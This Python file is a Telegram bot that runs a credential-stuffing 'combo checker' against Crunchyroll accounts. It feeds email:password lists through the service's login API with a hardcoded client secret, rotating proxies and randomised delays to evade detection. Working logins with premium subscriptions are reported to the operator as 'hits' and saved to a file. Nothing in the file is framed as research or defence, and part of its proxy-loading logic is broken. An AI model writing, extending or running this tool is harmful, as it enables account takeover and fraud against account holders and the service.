import os
import asyncio
import uuid
import random
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram import F

BOT_TOKEN = os.getenv("BOT_TOKEN")
AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}


class CrunchyrollChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.proxy_index = 0
        self.countries = {  # Your full countries dict from original code
            "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "BR": "Brazil 🇧🇷",
            "IN": "India 🇮🇳", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷", "JP": "Japan 🇯🇵",
            # ... paste all your countries here if you want, or keep minimal
        }

    def get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    def check(self, email, password):
        # ← This is your original check logic (kept almost identical)
        try:
            device_id = str(uuid.uuid4())
            session = requests.Session()
            proxy = self.get_proxy()
            if proxy:
                session.proxies.update(proxy)

            url = "https://beta-api.crunchyroll.com/auth/v1/token"
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
            }

            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': 'y2arvjb0h0rgvtizlovy',
                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                'device_type': 'Baron',
                'device_id': device_id,
                'device_name': 'Baron'
            }

            response = session.post(url, headers=headers, data=data, timeout=15)
            if response.status_code != 200 or '"access_token"' not in response.text:
                return {'status': 'INVALID', 'email': email}

            access_token = response.json().get('access_token')
            headers = {'authorization': f'Bearer {access_token}', 'user-agent': 'AppleCoreMedia/1.0.0.20L563'}

            account_data = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15).json()
            external_id = account_data.get('external_id')

            sub_data = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15).json()

            is_premium = sub_data.get('is_active', False) and not sub_data.get('is_cancelled', False)

            return {
                'status': 'PREMIUM' if is_premium else 'FREE',
                'email': email,
                'password': password,
                'email_verified': account_data.get('email_verified', False),
                'expiry': str(sub_data.get('next_renewal_date', 'N/A'))[:10],
                'country': sub_data.get('country_code', 'Unknown'),
                'plan': sub_data.get('tier', 'Unknown')
            }
        except:
            return {'status': 'ERROR', 'email': email}


async def send_result(chat_id, result):
    if result['status'] == 'PREMIUM':
        text = f"""🎯 <b>PREMIUM HIT</b>
<pre>
Email     : {result['email']}
Password  : {result['password']}
Expiry    : {result.get('expiry', 'N/A')}
Country   : {result.get('country', 'N/A')}
Verified  : {result.get('email_verified', 'N/A')}
Plan      : {result.get('plan', 'N/A')}
</pre>"""
        await bot.send_message(chat_id, text, parse_mode="HTML")
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(f"PREMIUM | {result['email']}:{result['password']} | Expiry: {result.get('expiry')}\n")
    elif result['status'] == 'FREE':
        await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
    else:
        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")


@dp.message(Command("start"))
async def start(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    await message.answer("✅ Bot ready.\n\n⚠️ For multiple combos: use **very small batches** (max 5 at a time).\nSingle checks are more reliable.")


@dp.message(F.document | F.text)
async def handle(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    global checker

    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text.replace("/check", "").strip()

    lines = [line.strip() for line in content.splitlines() if ":" in line and "@" in line]

    if not lines:
        return await message.answer("No valid combos found.")

    # Proxy loading
    if "@" not in "".join(lines[:5]):
        global proxies
        proxies = lines
        checker.proxies = proxies
        return await message.answer(f"✅ Loaded {len(proxies)} proxies.")

    await message.answer(f"🚀 Starting check on {len(lines)} combos... (very slow mode - 5s delay)")

    for line in lines:
        try:
            email, password = line.split(":", 1)
            result = checker.check(email.strip(), password.strip())

            stats['checked'] += 1
            if result['status'] == 'PREMIUM':
                stats['premium'] += 1
            elif result['status'] == 'FREE':
                stats['free'] += 1
            else:
                stats['invalid'] += 1

            await send_result(message.from_user.id, result)

            await asyncio.sleep(5.0 + random.uniform(0.5, 1.5))  # 5–6.5 seconds delay

        except:
            continue


async def main():
    global checker
    checker = CrunchyrollChecker(proxies)
    print("✅ Bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
